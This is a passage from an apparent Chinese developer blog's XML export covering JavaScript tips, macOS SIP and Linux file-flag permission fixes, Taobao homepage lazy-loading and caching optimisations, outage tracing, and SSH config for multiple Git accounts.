需要使用 eval 的场景并不多，尽量少用，一般需求使用 new Function 就能满足。 引用 删除属性存在的坑：a = {n: {x: 2}}, b = a.n; delete a.n; 这段代码执行之后，b.x 依然等于 2，原因是 {x:2} 这个对象被 a 和 b 同时引用，delete 指令只删除了 a 对它的引用，b 上的引用依然存在。这种问题有可能造成内存泄漏。 Object 扩展 Object 的 freeze 方法过于严格；defineGetter/lookupGetter 和对应的 Setter 是很好用的属性。 toLocalString 如图，你可能还不知道 JavaScript 的 toLocaleString 还可以这么玩。 this语义 this 上下文只存在两种语义，一种是被当作方法调用，this 指向调用它的对象；一种是作为函数调用，指向 Global 对象（严格模式下为 undefined）。它没有作用域的限制，如下图所示，a 由于是作为函数被调用，所以它指向的是 window，故而返回 false。 类型 JavaScript 可以被调用执行的均为 Function 类型，但是也存在可调用的 Object，如低版本 IE 中的一些宿主对象：document.getElementById、alert 等，在很多浏览器中 typeof RegExp 同样是 Object。这绝对是一个不标准的实现，在浏览器摒弃/修正这些错误类型之前应该尽量少依赖它们。 IE8 getter/setter Object.defineProperty 虽然是 ES5 的东西，早在 IE8 就已经支持了，但支持得并不完善，比如 writable、enumerable、configurable 这些配置项设置就无效，IE8 下主要支持 getter/setter。 JSON.stringify JSON.stringify 接受三个参数，很多人都知道第三个参数可以设置空白字符来美化输出，但是你可能不知道第二个参数的作用，它为 {Array|Function} 类型，如果为 Array 则用于过滤 key，如果为 Function 则可以对 value 做处理，如图所示。 Symbol ES6 中添加了一种新的数据类型，Symbol，它是一种原始数据类型（图一），具备对象的特性（图二），并可以指向同一个引用（图三），能够作为对象的 key 但不可枚举（图四），内置的 Symbol 会影响程序的执行（图五），Symbol.iterator 是个举足轻重的符号，能够让元素具备迭代属性（图六），花样很多。 附图见：http://weibo.com/1812166904/DqMwR8O6z 伪数组添加 Symbol.iterator 的几个办法：鸭式辨型的 iterator 函数、yield 函数和直接使用 Array 的遍历符号。 附图见：http://weibo.com/1812166904/DqMBYebPw Set/WeakSet Set/WeakSet 这种数据结构，不能说没用，但确实也没啥大用，前者就是个不允许出现重复成员的数组，顺便还带了点 ES6 的特性，后者虽说可以一定程度上防止内存泄漏，但是也容易出错，比如某个引用已经被垃圾回收了，再去使用它可能就返回 null。它们都是 ES6 的配套产物。而 Map/WeakMap 倒是两个非常不错的设计，常规的 Object 结构都为 String-Val 键值对，而它扩展为 AllType-Val，任意类型都可以作为它的 Key，无论是服务端编程还是客户端编程，这个属性都带来了极大的便利性。 正则 理解正则零宽的含义：正则中所谓的零宽断言，类似于锚点字符，它们匹配指定的位置而不会匹配内容，如 ^ 匹配开头，$ 匹配结尾，\b 匹配单词边界；(?=p) 匹配「接下来的字符与 p 匹配」的位置，(?!p) 匹配「接下来的字符不与 p 匹配」的位置。\b 字符匹配单词边界，实际上就是匹配 \w 与 \W 之间的位置（\w 匹配 [a-zA-Z0-9]）。很少会有人用到 \B，它匹配的是非单词边界位置，简单理解就是 \w &amp; \w 之间位置或者 \W &amp; \W 之间位置。 持续学习和分享… 内容都是片段化的分享，比较多，也比较杂，就没有全部列举出来，感兴趣的同学可以 follow 我的 微博，我的想法和笔记都会在上面同步。 感受在这之前犀牛书已经翻阅了差不多六七遍，很多内容都已经深深地刻在了脑海里，但时间久了也会忘记些，时而巩固复习下，毕竟是前端最基础部分。 带着问题去看书，收获是完全不一样的。犀牛书不难啃，难的是你对这些知识点的理解深度。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Unix/Linux 系统中的 Operation Not Permitted 问题]]></title>
    <url>%2Fblog%2F2016%2F04%2F06%2F2016-04-06-operation-not-permitted-problem-in-linux-or-unix-system%2F</url>
    <content type="text"><![CDATA[多次在 Mac 使用过程中遇到 Operation Not Permitted 问题，之前都是略过，今天好好摸索了一把，搞明白了道理，记录下来。 好几次整理移动硬盘数据的时候，都遇到了 Operation Not Permitted 问题，文件移动不了，也删除不掉，第一次遇到没理会，第二次是打开虚拟机，在 Windows 中操作这些问题文件，今天又遇到了，决定消灭它。 OS X EI Capitan 的 SIPApple 在 OS X 10.11 以后的版本中默认启动了一项系统保护程序，叫做 System Integrity Protection，也被唤作 rootless（寓意让 root 弱一点），该程序意在保护电脑不被恶意程序攻击，但是对于我们这群程序员，很多保护是多余的，甚至给我们带来了很多麻烦。 SIP 会锁定几个系统文件目录： 123/System/sbin/usr （/usr/local 除外） 在 SIP 的保护下，部分软件、功能、脚本都会失效，我们可以通过如下步骤关闭 SIP： 重启电脑，按下 Command + R 直到听到开机声音，此时电脑会进入恢复模式（Recovery Mode） 当 OSX 工具出现在屏幕中时，下拉工具（Utilities）菜单，选择终端（Terminal） 键入 csrutil disable，回车 电脑重启后，SIP 就关闭了 恢复 SIP 的方式同上，只不过终端中键入 csrutil enable。通过 csrutil status 可以检测系统当前 SIP 的启动状态： 12$ csrutil statusSystem Integrity Protection status: enabled. Linux 下的 file flags可能你也遇到过在 Linux 下删除文件报错： 12root@ubuntu:/home/barret/work# rm -f 1.md rm: cannot remove ‘1.md’: Operation not permitted 这个时候可以通过 lsattr 命令看看该文件是否被打了 flags： 12root@ubuntu:/home/barret/work# lsattr 1.md----i--------e-- ./1.md 如果文件上存在 i 标记，那肯定是删不掉的，同样这个文件也不能被编辑。可以进入 root 模式，去除这个标记： 1root@ubuntu:/home/barret/work# chattr -i 1.md 给保护文件添加标记的方式： 1root@ubuntu:/home/barret/work# chattr +i 1.md 也比较简单。 小结文本算是一个经验性的小科普，希望对你有帮助。]]></content>
      <categories>
        <category>网络安全</category>
        <category>Linux</category>
        <category>苹果</category>
      </categories>
      <tags>
        <tag>Operation Not Permitted</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[淘宝首页性能优化实践]]></title>
    <url>%2Fblog%2F2016%2F04%2F01%2F2016-04-01-optimization-in-taobao-homepage%2F</url>
    <content type="text"><![CDATA[上文 《一起来看看淘宝首页的个性化》 中，带大家看了下弥散着个性化味道的新首页，前端面临着： 数据来源多 串行请求渲染一个模块 运营数据和个性化数据匹配和管理 数据兜底容灾 等多个问题。本次淘宝首页改版，虽已不再支持 IE6 和 IE7 等低版本的古董浏览器，但是依然存在多个影响首页性能的因素： 依赖系统过多，数据的请求分为三块，其一是静态资源（如 js/css/image/iconfont 等）；其二是推到 CDN 的静态数据（如运营填写的数据、前端配置信息等）；其三是后端接口，不同的模块对应不同的业务，而且页面中还有不少的广告内容，粗略估计页面刚加载时首屏发出的接口请求就有 8 个，滚到最底下，得发出 20 多个请求。 无法直接输出首屏数据，首屏很多数据是通过异步请求获取的，由于系统限制，这些请求不可避免，而且请求个数较多，十分影响首屏时间。 模块过多，为了能够在后台隔离运营之间填写数据的权限，模块必须做细粒度的拆分，如下图所示：一个简单的模块必须拆分成多个行业小模块，页面中其他位置也是如此，而且这些被拆分出来的模块还不一定会展现出来，需要让算法告诉前端展示哪些模块。 图片过多，翻页往下滚动，很明显看到，页面整屏整屏的图片，有些图片是运营填写，有些图片由个性化接口提供，这些图片都没有固定的尺寸。 网页性能衡量指标网页性能衡量指标有很多，倘若能够把握关键的几个，集中优化，性能自然也就上去了。 FPS最能反映页面性能的一个指标是 FPS（frame per second），一般系统设定屏幕的刷新率为 60fps，当页面元素动画、滚动或者渐变时绘制速率小于 60，就会不流畅，小于 24 就会卡顿，小于 12 基本认定卡爆了。 1 帧的时长约 16ms，除去系统上下文切换开销，每一帧中只留给我们 10ms 左右的程序处理时间，如果一段脚本的处理时间超过 10ms，那么这一帧就可以被认定为丢失，如果处理时间超过 26ms，可以认定连续两帧丢失，依次类推。我们不能容忍页面中多次出现连续丢失五六帧的情况，也就是说必须想办法分拆执行时间超过 80ms 的代码程序，这个工作并不轻松。 页面在刚开始载入的时候，需要初始化很多程序，也可能有大量耗时的 DOM 操作，所以前 1s 的必要操作会导致帧率很低，我们可以忽略。当然，这是对 PC 而言，Mobile 内容少，无论是 DOM 还是 JS 脚本量都远小于 PC，1s 可能就有点长了。 DOMContentLoaded 和 LoadDOM 加载并且解析完成才会触发 DOMContentLoaded 事件，倘若源码输出的内容过多，客户端解析 DOM 的时间也会响应加长，不要小看这里的解析时间，如果 DOM 数量增加 2000 个并且嵌套层级较深，解析时间也会相应增加 50-200ms，这个消耗对大多数页面来说其实是没必要的，保证首屏输出即可，后续的内容只保留钩子，利用 JS 动态渲染。 Load 时间可以用来衡量首屏加载中，客户端接受的信息总量，如果在首屏中充满了大尺寸图片或者客户端与后端建立连接次数较多，Load 时间也会相应被拖长。 流畅度流畅度是对 FPS 的视觉反馈，FPS 值越高，视觉呈现越流畅。为了保障页面的加载速度，很多内容不会在页面打开的时候全部加载到客户端。这里提到的流畅度是等待过程中的视觉缓冲，如下方是 Google Plus 页面的一个效果图： 墙内访问 google 的速度不是很快，上面元素中的的很多内容都是通过异步方式加载，而从上图可以看出 Google 并没有让用户产生等待的焦虑感。 淘宝首页的性能优化由于平台限制，淘宝首页面临一个先天的性能缺陷，首屏的渲染需要从 7 个不同的后端取数据，这些数据请求是难以合并的，如果用户屏幕比较大，则首屏的面积也比较大，对应的后端平台数据接口就更多。数据是个性化内容或者为广告内容，故请求也不能缓存。 关键模块优先不论用户首屏的面积有多大，保证关键模块优先加载。下面代码片段是初始化所有模块的核心部分： 12345678910111213141516171819202122232425$('.J_Module').each(function(mod) &#123; var $mod = $(mod); var name = $mod.attr('tms'); var data = $mod.attr('tms-data'); if($mod.hasClass('tb-pass')) &#123; Reporter.send(&#123; msg: "跳过模块 " + name &#125;); return; &#125; // 保证首屏模块先加载 if (/promo|tmall|tanx|notice|member/.test(name)) &#123; window.requestNextAnimationFrame(function()&#123; // 最后一个参数为 Force, 强制渲染, 不懒加载处理 new Loader($mod, data, /tanx/.test(name)); &#125;); &#125; else &#123; // 剩下的模块进入懒加载队列 lazyQueue.push(&#123; $mod: $mod, data: data, force: /fixedtool|decorations|bubble/.test(name) &#125;); &#125;&#125;); TMS 输出的模块都会包含一个 .J_Module 钩子，并且会预先加载 js 和 css 文件。 对于无 JS 内容的模块，会预先打上 tb-pass 的标记，初始化的时候跳过此模块；对于首屏模块关键模块，会直接进入懒加载监控： 123456789// $box 进入浏览器视窗后渲染// new Loader($box, data) -&gt;datalazyload.addCallback($box, function() &#123; self.loadModule($box, data);&#125;);// $box 立即渲染// new Loader($box, data, true) -&gt;self.loadModule($box, data); 除必须立即加载的模块外，关键模块被加到懒加载监控，原因是，部分用户进入页面就可能急速往下拖拽页面，此时，没必要渲染这些首屏模块。 非关键模块统一送到 lazyQueue 队列，没有基于将非关键模块加入到懒加载监控，这里有两个原因： 一旦加入监控，程序滚动就需要对每个模块做计算判断，模块太多，这里可能存在性能损失 如果关键模块还没有加载好，非关键模块进入视窗就会开始渲染，这势必会影响关键模块的渲染 那么，什么时候开始加载非关键模块呢？ 12345678910111213141516171819202122var __lazyLoaded = false;function runLazyQueue() &#123; if(__lazyLoaded) &#123; return; &#125; __lazyLoaded = true; $(window).detach("mousemove scroll mousedown touchstart touchmove keydown resize onload", runLazyQueue); var module; while (module = lazyQueue.shift()) &#123; ~function(m)&#123; // 保证在浏览器空闲时间处理 JS 程序, 保证不阻塞 window.requestNextAnimationFrame(function() &#123; new Loader(m.$mod, m.data, m.force); &#125;); &#125;(module); &#125;&#125;$(window).on("mousemove scroll mousedown touchstart touchmove keydown resize onload", runLazyQueue);// 担心未触发 onload 事件, 5s 之后执行懒加载队列window.requestNextAnimationFrame(function() &#123; runLazyQueue();&#125;, 5E3); 上面的代码应该十分清晰，两种请求下会开始将非关键模块加入懒加载监控： 当页面中触发 mousemove scroll mousedown touchstart touchmove keydown resize onload 这些事件的时候，说明用户开始与页面交互了，程序必须开始加载。 如果用户没有交互，但是页面已经 onload 了，程序当然不能浪费这个绝佳的空档机会，趁机加载内容；经测试，部分情况下，onload 事件没有触发（原因尚不知），所以还设定了一个超时加载，5s 之后，不论页面加载情况如何，都会将剩下的非关键模块加入到懒加载监控。 懒执行，有交互才执行如果说上面的优化叫做懒加载，那么这里的优化可以称之为懒执行。 首页上有几个模块是包含交互的，如头条区域的 tab ，便民服务的浮层和主题市场的浮层，部分用户进入页面可能根本不会使用这些功能，所以程序上并没有对这些模块做彻底的初始化，而是等到用户 hover 到这个模块上再执行全部逻辑。 更懒的执行，刷新页面才执行首屏中有两个次要请求，一个是主题市场的 hot 标，将用户最常逛的三个类目打标；第二个是个人中心的背景，不同的城市会展示不同的背景图片，这里需要请求拿到城市信息。 这两处的渲染策略都是，在程序的 idle（空闲）时期，或者 window.onload 十秒之后去请求，然后将请求的结果缓存到本地，当用户第二次访问淘宝首页时能够看到效果。这是一种更懒的执行，用户刷新页面才看得到.这种优化是产品能够接受，也是技术上合理的优化手段。 图片尺寸的控制和懒加载不论图片链接的来源是运营填写还是接口输出，都难以保证图片具备恰当的宽高，加上如今 retina 的屏幕越来越多，对于这种用户也要提供优质的视觉体验，图片这块的处理并不轻松。 1&lt;img src='//g.alicdn.com/s.gif' data-src='//g.alicdn.com/real/path/to/img.png' /&gt; 阿里 CDN 是支持对图片尺寸做压缩处理的，如下图为 200x200 尺寸的图片： 加上 _100x100.jpg 的参数后，会变成小尺寸： 我们知道 webp 格式的图片比对应的 jpg 要小三分之一，如上图加上 _.webp 参数后: （不支持 webp 格式的浏览器展示不出来这张图片） 视觉效果并没有什么折扣，但是图片体积缩小了三分之一，图片越大，节省的越明显。显然，淘宝首页的所有图片都做了如上的限制，针对坑位大小对图片做压缩处理，只是这里需要注意的是，运营填写的图片可能已经是压缩过的，如： 123$img = '//g.alicdn.com/real/path/to/img.png_400x400.jpg';&lt;img src='&#123;&#123;$img&#125;&#125;_100x100jpg_.webp' /&gt; 上面这种情况，图片是不会正确展示的。首页对所有的图片的懒加载都做了统一的函数处理： 12345678910111213141516171819202122232425src = src.replace(/\s/g, '');var arr;if (/(_\d&#123;2,&#125;x\d&#123;2,&#125;\w*?\.(?:jpg|png))&#123;2,&#125;/.test(src) &amp;&amp; src.indexOf('_!!') == -1) &#123; arr = src.split('_'); if (arr[arr.length - 1] == '.webp') &#123; src = [arr[0], arr[arr.length - 2], arr[arr.length - 1]].join('_'); &#125; else &#123; src = [arr[0], arr[arr.length - 1]].join('_'); &#125;&#125;if (src.indexOf('_!!') &gt; -1) &#123; src = src.replace(/((_\d&#123;2,&#125;x\d&#123;2,&#125;[\w\d]*?|_co0)\.(jpg|png))+/, '$1');&#125;WebP.isSupport(function(isSupportWebp) &#123; // https 协议访问存在问题 IE8，去 schema if (/^http:/.test(src)) &#123; src = src.slice(5); &#125; // 支持 webp 格式，并且 host 以 taobaocdn 和 alicdn 结尾，并且不是 s.gif 图片 if (isSupportWebp &amp;&amp; /(taobaocdn|alicdn)\.com/.test(src) &amp;&amp; (src.indexOf('.jpg') || src.indexOf('.png')) &amp;&amp; !/webp/.test(src) &amp;&amp; !ignoreWebP &amp;&amp; !/\/s\.gif$/.test(src)) &#123; src += '_.webp'; &#125; $img.attr('src', src);&#125;); 模块去钩子，走配置TMS 的模块在输出的时候会将数据的 id 放在钩子上： 1&lt;div class='J_Module' tms-datakey='2483'&gt;&lt;/div&gt; 如果模块是异步展示的，可以通过 tms-datakey 找到模块数据，而首页的个性化是从几十上百个模块中通过算法选出几个，如果把这些模块钩子全部输出来，虽说取数据方便了很多，却存在大量的冗余，对此的优化策略是：将数据格式相同的模块单独拿出来，新建页面作为数据页。所以可以在源码中看到好几段这样的配置信息： 1&lt;textarea class="tb-hide"&gt;[&#123;"backup":"false","baseid":"1","mid":"222726","name":"iFashion","per":"false","tid":"3","uid":"1000"&#125;,&#123;"backup":"false","baseid":"3","mid":"222728","name":"美妆秀","per":"false","tid":"3","uid":"1001"&#125;,&#123;"backup":"false","baseid":"4","mid":"222729","name":"爱逛街","per":"false","tid":"4","uid":"1002"&#125;,&#123;"backup":"false","baseid":"2","mid":"222727","name":"全球购","per":"false","tid":"4","uid":"1003"&#125;]&lt;/textarea&gt; 减少了大量的源码以及对 DOM 的解析。 低频修改模块，缓存请求有一些模块数据是很少被修改的，比如接口的兜底数据、阿里 APP 模块数据等，可以通过调整参数，设置模块的缓存时间，如： 123456789io(&#123; url: URL, dataType: 'jsonp', cache: true, jsonpCallback: 'jsonp' + Math.floor(new Date / (1000 * 60)), success: function() &#123; //... &#125;&#125;); Math.floor(new Date / (1000 * 60)) 这个数值在一分钟内是不会发生变化的，也就是说将这个请求在本地缓存一分钟，对于低频修改模块，缓存时间可以设置为一天，即： 1Math.floor(new Date / (1000 * 60 * 60 * 24)) 当然，我们也可以采用本地储存的方式缓存这个模块数据： 1offline.setItem('cache-moduleName', JSON.stringify(data), 1000 * 60 * 60 * 24); 缓存过期时间设置为 1 天，淘宝首页主要采用本地缓存的方式。 使用缓动效果减少等待的焦急感这方面的优化不是很多，但是也有一点效果，很多模块的展示并不是干巴巴的 .show()，而是通过动画效果，缓动呈现，这方面的优化推荐使用 CSS3 属性去控制，性能消耗会少很多。 优化的思考角度上文 《一起来看看淘宝首页的个性化》 中提到几个黄金法则： 首屏一定要快 滚屏一定要流畅 能不加载的先别加载 能不执行的先别执行 渐进展现、圆滑展现 性能优化的切入角度不仅仅是上几个方面，对照 Chrome 的 Timeline 柱状图和折线图，我们可以找到几个优化的点： 在 1.0s 左右存在一次 painting 阻塞，可能因为一次性展示的模块面积过大 从 FPS 的柱状图可以看出，在 1.5s-2.0s 之间，存在几次 Render 和 JavaScript 丢帧 从多出的红点可以看出页面 jank 次数，也能够定位到代码堆栈 在优化的过程中需要更多地思考，如何让阻塞的脚本分批执行，如何将长时间执行的脚本均匀地分配到时间线上。这些优化都体现在代码的细节上，宏观上的处理难以有明显的效果。当然，在宏观上，淘宝首页也有一个明显的优化： 1234567891011121314151617181920212223// //gist.github.com/miksago/3035015#file-raf-js(function() &#123; var lastTime = 0; var vendors = ['ms', 'moz', 'webkit', 'o']; for(var x = 0; x &lt; vendors.length &amp;&amp; !window.requestAnimationFrame; ++x) &#123; window.requestAnimationFrame = window[vendors[x]+'RequestAnimationFrame']; window.cancelAnimationFrame = window[vendors[x]+'CancelAnimationFrame'] || window[vendors[x]+'CancelRequestAnimationFrame']; &#125; if (!window.requestAnimationFrame) &#123; window.requestAnimationFrame = function(callback, element) &#123; var currTime = new Date().getTime(); var timeToCall = Math.max(0, 16 - (currTime - lastTime)); var id = window.setTimeout(function() &#123; callback(currTime + timeToCall); &#125;, timeToCall); lastTime = currTime + timeToCall; return id; &#125;; &#125; if (!window.cancelAnimationFrame) &#123; window.cancelAnimationFrame = function(id) &#123; clearTimeout(id); &#125;; &#125;&#125;)(); 这段代码基本保证每个模块的初始化都是在浏览器空闲时期，减少了很多不必要的丢帧。这个优化也可以被应用到每个模块的细节代码之中，不过优化难度会更高。 小结代码的性能优化是一个精细活，如果你要在一个庞大的未经优化的页面上做性能优化，可能会面临一次重构代码。本文从淘宝首页个性化引出的问题出发，从微观到宏观讲述了页面的优化实践，提出了几条可以借鉴的「黄金法则」，希望对你有所启发，后续会继续给大家带来淘宝首页稳定性保障的分享。]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>淘宝首页</tag>
        <tag>性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一起来看看淘宝首页的个性化]]></title>
    <url>%2Fblog%2F2016%2F03%2F31%2F2016-03-31-personality-in-taobao-home-page%2F</url>
    <content type="text"><![CDATA[随着互联网技术以及软硬件技术的快速发展，网络已经成为人们生活中不可或缺的一部分，在长期的互联网冲浪中，网民对网络信息的辨识度日益增进，网络信息提供方也必须与时俱进，抓住用户的要害。 就拿我们淘宝的业务来看，几年前看到最多的是以商品为维度分类、分层；而现在，一切以人为中心，围绕用户做产品，帮助用户挖掘消费区间，帮助用户找到自己感兴趣的东西。淘宝首页就被拿出来开了一刀，作为淘宝的门户，它承载了万千入口，如何让用户直达兴趣之地？那自然少不了千人千面地展现内容。今年淘宝首页的改版，无处不散发个性化的味道： 淘宝首页的个性化需求首页的内容运营不是一两个人可以完成的，四五十个业务，每个业务又有很多子业务方向，为了让所有运营有序的在首页编辑数据，主体采用 TMS 搭建，目的是隔离模块权限（当然，目前淘系也没有比 TMS 更适合的平台来搭建首页）。 为了满足不同产品的需求，同时更好地展现产品特征，设计中采用了大量的色彩，如下图所示： 同时也为业务提供了多套可供选择的模板： 在满足业务需求的前提下，更重要的是以人为中心，把用户喜欢的东西放到最醒目的位置。如下图「我常逛的」区块，通过算法介入，打分排序，从业务池子中的几十个模块中选出四个： 每个模块中的很多数据都是通过个性化接口获取的，并且为了提高运营的执行效率，需要前端实现以下功能： 对于整个区块，运营可以对业务置顶、排序 对于区块中的每个业务模块，支持运营配置其版式，以及配置该模块是否需要关闭个性化 对于模块中的每个数据坑位，支持运营干预是否需要个性化 对于部分业务模块，支持运营配置多条数据，然后算法决定出哪几条 而有部分业务，会采用自己的业务数据，该模块的渲染则需要独立处理 简单而言，就是需要实现模块的位置、模板、内容（或者部分内容）个性化，同时对每个维度做开关控制。为了更好地告诉用户自己的属性，也会在导航上为用户打标： 设计也会有个性化的需求，如不同地域的人群展示不同的内容： 前端面临的问题先记住一句话：「不能相信任何数据源」，数据源出来的数据偶尔出乎你的意料，数据缺少条目、格式不对、状态不对、回调不对等等。 从上面的个性化需求可以看出，前端面临的问题还是不少的。 首先，数据的来源较多。 每个区块采用的算法不一样，所以每个区块对应的数据接口也各不会相同，并且一个模块中，并不是所有数据都会走个性化接口，还有一部分数据来自运营的手工填写（运营手工填写的内容，部分同步渲染，部分异步渲染）。有些运营为了方便管理投放，如多个运营维护一个坑位的情况，会采用其他平台投放，前端需要通过平台接口获取数据；再加上部分业务有自己的后端服务，前端只能通过他们的后端接口获取数据；页面上还有不少阿里妈妈的广告，自然也是走他们的接口。约摸算来，整个首页的数据接口不下于 15 个。 大多数区块的渲染，需要经历两次串行的请求 。首先通过算法接口拿到需要展示的模块 id 、模块排序和模块的个性化数据，然后通过模块 id 加载对应的非个性化数据（非个性化数据中包含了运营对个性化数据的干预逻辑），合并两个数据后才能渲染一个区块。有人问： 是不是可以并行请求两者？答案是不能，业务模块实在是太多了，如果把所有 id 的模块数据都拿过来，数据太多。 算法那边是否可以将所有业务的数据都拿过去，然后只给前端传输整合后的数据？答案依然是不行，业务数据可能被实时修改，算法那边同步是个问题，目前没有较好的设施完成这套数据同步。 是否可以让算法的数据流过业务数据，将最后需要的数据过滤出来？答案是这很靠谱，然而这套体系还没有完善，本次改版无缘用上。 第三个问题是，数据匹配问题。业务模块有一个 id，这个 id 需要前端与后端约定好；而业务的非个性化数据因为要异步加载，也有一个数据请求 id，这个 id 由 TMS 平台产生，业务模块较多，两类 id 需要人肉匹配。在前后端的交互过程中，可能会出现如下问题： 算法提供的数据 id 中有一个在前端这里找不到 算法提供的数据存在重复/过少/过多 算法提供的数据中某一项的数据格式不对 前端还有一个模板匹配的问题，为了保证数据的纯洁性（其实是为了让运营配置后台清爽），光看业务数据是不知道该数据匹配哪种模板的，前端在区块配置列表中还得加上模块的模板 id，可以看看区块的配置后台： 第四，也是一个让人头疼的问题，兜底容灾的处理，对于单模块单数据源的渲染，容灾是一件相当轻松的事情。而对于多模块多数据源的容灾处理，其逻辑的复杂程度超乎想象。 黄金准则为了让页面能够流畅地渲染，技术上下点功夫那是必须的！站在用户体验的角度去思考，其实很多问题都会迎刃而解： 首屏一定要快 滚屏一定要流畅 能不加载的先别加载 能不执行的先别执行 渐进展现、圆滑展现 在快的基础上做到手感丝滑，需要优化的点有很多，下篇将给大家带来 淘宝首页的性能优化实践。]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>个性化</tag>
        <tag>淘宝首页</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对系统链路问题排查的一些看法]]></title>
    <url>%2Fblog%2F2016%2F03%2F19%2F2016-03-19-problem-debugging%2F</url>
    <content type="text"><![CDATA[页面上发现几个模块展示比较缓慢，白了大约 5s 之后展示兜底，显然，是接口请求超时了，打开控制台一看，果然，接口挂了。看了下相关页面，因为大量用到这个接口，模块也都加载超时了。换一台电脑看了下，存在一样的问题，确认是接口挂了。 10 min 左右后接口却又恢复正常。于是出现下面系列流程： 联系相应的同学，最后找到能排查问题的人。 查看监控平台，发现确实没有数据过来。 查看服务器日志，发现确实没有日志进来，确认监控数据未出错。 结论是平台无错误。 继续溯源， 平台上一层是统一接入，查看 lvs，发现没有流量进来 查看机器系统日志，lvs 有人在调试 当然，问题在这里已经找到了。如果这一步还没有找到，就需要继续溯源，看看域名解析是否有问题，DNS 解析是否有问题了。 自动化的检测当用户发现网页模块超时加载后， 前端系统警报 触发对应接口的链路查询 检查 DNS 解析是否正常 检查证书是否过期，是否正确部署 检查统一接入层是否有流量异常 检查平台监控数据是否异常 检查服务器日志是否异常 检查程序是否报错 而这条链路也可以在平时正向冒烟测试，定期检查是否存在问题，提早发现问题，这样才能发挥监控的价值。]]></content>
      <categories>
        <category>网络交互</category>
        <category>网络技术</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>链路问题排查</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多 SSH Key 管理技巧与 Git 多账户登录问题]]></title>
    <url>%2Fblog%2F2016%2F03%2F09%2F2016-03-09-config-in-ssh-after-troubling-git-connection%2F</url>
    <content type="text"><![CDATA[对很多开发者，尤其是手握几台甚至几十台机器的同学而言，登录到远程机器处理事务应该是家常便饭。如果你也是其中一员，悄悄问一句，你平时是如何记住一堆帐号、机器地址以及一些附加登录选项的呢？或许你也是这么干的： 倘若你有一个远程服务器，地址为 test.server.com, 防止人为攻击，你将 ssh 的端口号从 22 改成了 8892，当你需要登录到这台机器时，需要这么做： 12➜ ~ ssh YOURNAME@test.server.com -p 8892password: ******* 尚好。如果你先前已经将已经注册了一个公钥/私钥对，并且正确的部署到了远程机器，你可以省却输入密码这个环节（推荐学习 ssh-copy-id 命令）。 为了可以再懒一点，索性将这一串代码添加一个 alias： 12➜ ~ alias test='ssh YOURNAME@test.server.com -p 8892'➜ ~ test 一条 test 命令即可让你登录到服务器，对于只有一两台远程机器的你，应该算是特别便捷了。 多 SSH Key 的管理SSH 连接建立之前，会在系统中寻找它的配置，一般有两个位置。 /etc/ssh/ssh_config 这里是对所有用户适用的全局配置 ~/.ssh/config 或者 $HOME/.ssh/config 这是用户的个人配置，这些配置会覆盖全局配置 注意：一般来说，我们给 ~/.ssh 文件夹赋予的权限为 0700。 配置格式比较简单，以下配置等同于上面我们的登录命令设置： 1234Host test HostName test.server.com User YOURNAME Port 8892 可以是 param value 也可以为 param=value，其中 param 对大小写不敏感，value 对大小写敏感。 使用 ssh test 即可完成登录，当我们有稍微麻烦点配置的时候，如数据库的 3306 端口对外不开放，可以开放另一个接口，然后内部跳转到 3306，使用命令行的写法是： 1ssh -f -N -L 8999:127.0.0.1:3306 test@database.server.com 大串的命令行，过多的参数，实在是有点不好记。而在 config 文件中的配置就一目了然： 1234Host test HostName test.server.com User YOURNAME LocalForward 8999 127.0.0.1:3306 当你有多台远程终端的时候，config 文件的优势就更加明显了： 123456789101112131415161718# serverlist Host list HostName *.serverlist.com User YOURNAME IdentityFile ~/.ssh/serverlist.com.key# personal server Host personal HostName proxy1.barretlee.com proxy2.barretlee.com User barretlee IdentityFile ~/.ssh/proxy.barretlee.com.key# schoolHostName 222.20.74.89 User school LocalForward 8999 127.0.0.1:3306 IdentityFile ~/.ssh/school.key# and so on. 这里常用的的 param 也不是很多： Host，SSH 连接名 HostName，如上所示，可以是通配符，可以是 IP，也可以是域名等 User，登录的用户名 IdentifyFile，version 1 协议下默认是 ~/.ssh/identify，version 2 协议下，默认是依次匹配：~/.ssh/id_dsa，~/.ssh/id_ecdsa，~/.ssh/id_rsa，还有 version 2 兼容模式。 LocalForward 端口的内部跳转 Port，端口设置，默认 SSH 的端口是 22 Protocal，协议版本号，1 或者 2 Git 多账户登录问题向仓库 push 代码之前，我们都会做一番设置，简单归纳为如下几步： 注册获取用户名 barretlee 创建仓库 barretlee/test.git 创建密钥，ssh-keygen -t rsa -C &quot;barret.china@gmail.com&quot; 将公钥 id_rsa.pub 填到 Git Server 上（如果没有可视化界面，还需要登录到 Server 命令行操作推送） 本地通过 ssh-agent 将密钥添加到 session 中，ssh-add id_rsa，部分终端中还需要手动开启 ssh-agent 然后测试连接，如 github 中， ssh -T git@git.github.com 看到了 ‘welcome barretlee…’ 的提示，开始 push 你的代码 突然有一天，你又注册了一个帐号 xiaohuzige，也走了一遍上面的流程，发现死活也连接不上，服务器总是提示：You have no permission to access this repo，这是怎么回事呢？ 这个时候，你可以输入这个命令，看看是哪个环节出了问题： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253➜ ~ ssh -vT git@github.comOpenSSH_6.9p1, LibreSSL 2.1.7debug1: Reading configuration data /Users/barretlee/.ssh/configdebug1: /Users/barretlee/.ssh/config line 2: Applying options for *debug1: Reading configuration data /etc/ssh/ssh_configdebug1: /etc/ssh/ssh_config line 20: Applying options for *debug1: /etc/ssh/ssh_config line 102: Applying options for *debug1: Connecting to github.com [192.30.252.128] port 22.debug1: Connection established.debug1: key_load_public: No such file or directorydebug1: identity file /Users/barretlee/.ssh/id_rsa type -1debug1: key_load_public: No such file or directorydebug1: identity file /Users/barretlee/.ssh/id_rsa-cert type -1debug1: key_load_public: No such file or directorydebug1: identity file /Users/barretlee/.ssh/id_dsa type -1debug1: key_load_public: No such file or directorydebug1: identity file /Users/barretlee/.ssh/id_dsa-cert type -1debug1: key_load_public: No such file or directorydebug1: identity file /Users/barretlee/.ssh/id_ecdsa type -1debug1: 